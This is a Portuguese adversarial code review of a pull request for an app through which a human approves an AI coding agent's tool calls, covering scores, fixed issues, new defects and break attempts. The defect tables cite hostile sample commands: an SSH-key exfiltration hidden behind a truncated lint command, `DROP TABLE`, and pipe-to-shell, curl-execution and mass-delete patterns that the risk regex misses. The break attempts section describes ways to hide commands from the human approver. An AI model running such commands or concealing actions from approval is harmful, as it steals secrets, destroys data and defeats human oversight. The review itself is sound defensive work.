# Fase 4: rodada 2 (revisão adversarial do Claude Code)

- Data: 2026-10-08.
- Revisor: Claude Code (Opus), com subagente de contexto limpo, somente leitura.
- Alvo: PR #6, SHA `5148c35`. O delta `9c02948` (SO_REUSEADDR no Unix) foi
  conferido à parte e fecha o R2-7.
- Escopo: as correções de P1–P9 da rodada 1. Ficam fora da rodada as pendências
  que o autor declarou: configuração de risco, vínculo de sessão do MCP (P8),
  notificações e requisitos ampliados.
- Review no GitHub: https://github.com/rexia-intel-automation/scribe/pull/6#pullrequestreview-5450908853
- **Veredito: REPROVADA por nota.** Não há problema alto nem crítico. B, C, D e F
  ficam abaixo do mínimo de 9.

## Notas (rodada parcial: G, H e I não avaliadas)

| Área (mín.) | Nota | Evidência |
| --- | --- | --- |
| A (9) | 9 | Saída conforme o contrato. P7 resolvido com payload real (`tool_key`, `decisions.rs:106,208-216`). |
| B (9) | 8 | R2-4 e R2-5: o humano ainda aprova sem ver o alvo inteiro. Além disso, qualquer `=` no comando manda o pedido para o terminal: é seguro, mas reduz a utilidade. |
| C (9) | 8 | P2 sólido. R2-1, R2-2, R2-4 e R2-5 abertos. |
| D (9) | 8 | Fail-safe completo (130 s > 125 s > 120 s; qualquer erro sai sem decisão). Há o DoS do R2-1. |
| E (8) | 8 | O crate `hook-protocol` é pequeno e claro. A regex de risco continua fixa no código. |
| F (9) | 8 | Bons testes contra impostor e forja. Faltam testes de replay com novo registro do nonce, de bind concorrente, de chave extra (R2-5) e de truncamento (R2-4). |
| J (8) | 8 | `fase-4.md` registra os limites com honestidade. O teste "reject_replay" promete mais do que cobre. |

## Status da rodada 1

- **P1 · corrigido.** Alvo redigido ou com caractere de controle leva a `can_allow=false` e ao botão "responder no terminal" (`decisions.rs:99-105,274-277`).
- **P2 · corrigido.** Challenge/request/response com HMAC sobre `hook_key` de 256 bits, com separação de domínio, campos com prefixo de tamanho e `verify_slice`. Nem o Bearer nem o payload saem antes da prova do servidor. A resposta fica amarrada a nonce, evento, status e corpo. `SO_EXCLUSIVEADDRUSE` no Windows. ACL protegida no `connection.json`.
- **P3 · corrigido** nos casos citados. Lacunas restantes no R2-8.
- **P4 · parcial.** Ver R2-5.
- **P5 · corrigido.** Carência de 1 s no backend, botão separado e `event.detail>1` rejeitado.
- **P6 · corrigido.** Opções ambíguas são rejeitadas e a resposta usa o texto original.
- **P7 · corrigido.** Correlação por `tool_key` sem depender de `tool_use_id`.
- **P8 · fora do escopo** desta rodada.
- **P9 · corrigido.** Prazo com `Instant`; um envio que falha expira o cartão.

## Problemas novos

| Id | Severidade | Onde | Defeito |
| --- | --- | --- | --- |
| R2-4 | média · **bloqueia** | `style.css:213`, `DecisionCard.tsx:86-117` | O alvo aparece truncado (`nowrap` + `ellipsis`) e o Permitir funciona sem expandir. Exemplo: `npm run lint -- --fix && scp ~/.ssh/id_ed25519 x@y:`. |
| R2-5 | média · **bloqueia** | `decisions.rs:89-105` | `find_map` pega a primeira chave conhecida, e as demais ficam fora da tela e do `RISK`. Exemplo: `{"path":…, "sql":"DROP TABLE users"}`. |
| R2-1 | média | `server.rs:223-261` | O challenge sem autenticação consome o rate limit global; uma página web causa 429 (DoS, sem allow). |
| R2-2 | média | `server.rs:225-238`, `.mcp.json:7` | O Bearer ainda é aceito em `/v1/hooks/*` e vaza pelo MCP para um impostor. Permite cartões falsos ou cancelar os reais, nunca allow. |
| R2-3 | baixa | `server.rs:292-297` | Um nonce consumido pode ser registrado de novo, o que permite replay de um POST capturado. |
| R2-6 | baixa | `decisions.rs:105` | `is_control` não detecta bidi nem Cf. |
| R2-7 | baixa | `server.rs:70-93` | Sem SO_REUSEADDR no Unix, há portBusy no reinício. **Corrigido em 9c02948.** |
| R2-8 | baixa | `decisions.rs:10` | A regex deixa passar `\| /bin/sh`, `\| env sh`, `bash <(curl)`, `sh -c "$(curl)"`, `git push +main`, `git clean -fdx` e `find / -delete`. |

## Tentativas de quebra

1. Impostor sem a chave respondendo allow: **falhou**.
2. Usar o app como oráculo para forjar request ou response: **falhou** (separação de domínio).
3. Trocar deny por allow ou reaproveitar a resposta de outro pedido: **falhou**.
4. Replay de um request capturado: **funcionou**, com novo registro do nonce (R2-3).
5. Bearer roubado via MCP: **funcionou** para injetar ou cancelar cartões (R2-2), sem allow.
6. Saturar o rate limit a partir de uma página web: **plausível** (R2-1); o fail-safe se mantém.
7. Esconder o comando: **funcionou** por truncamento (R2-4) e por chave extra (R2-5).
8. Confirmar o risco com duplo clique ou adiantando o relógio: **falhou**.
9. Bind concorrente com SO_REUSEADDR no Windows: **falhou**, pela leitura do código.

## Para a rodada 3

São obrigatórios R2-4 e R2-5, com testes. R2-1 e R2-2 são recomendados. Nada foi
compilado nem executado nesta rodada. R2-1 e R2-6 são plausíveis só pela leitura do código.
